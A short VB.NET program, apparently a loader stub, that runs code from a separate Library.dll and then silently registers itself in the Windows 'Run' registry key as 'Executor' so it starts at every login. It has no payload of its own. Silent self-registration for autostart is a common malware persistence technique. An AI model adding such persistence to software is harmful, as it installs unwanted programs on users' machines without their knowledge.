Imports Microsoft.Win32
Module Module1
    Public Sub Main()
        Try
            Library.Main() 'Load Library.dll
            Try
                Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue("Executor", Reflection.Assembly.GetExecutingAssembly.Location) 'Startup
            Catch
            End Try
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
End Module